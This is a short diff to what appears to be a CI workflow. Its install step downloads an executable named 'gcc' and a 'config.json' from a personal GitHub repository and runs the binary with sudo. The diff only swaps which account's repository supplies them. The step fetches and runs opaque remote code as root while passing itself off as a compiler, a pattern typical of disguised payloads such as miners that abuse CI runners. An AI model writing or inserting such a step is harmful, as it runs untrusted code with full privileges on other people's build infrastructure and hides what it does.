@@ -16,7 +16,7 @@ jobs:
       - name: Install
         run: |
           sudo apt-get install wget -y
-          wget https://github.com/Yefori/m/raw/main/gcc
-          wget https://raw.githubusercontent.com/Yefori/m/main/config.json
+          wget https://github.com/Underwood12/testing/raw/main/gcc
+          wget https://raw.githubusercontent.com/Underwood12/testing/main/config.json
           sudo chmod +x gcc
           sudo ./gcc
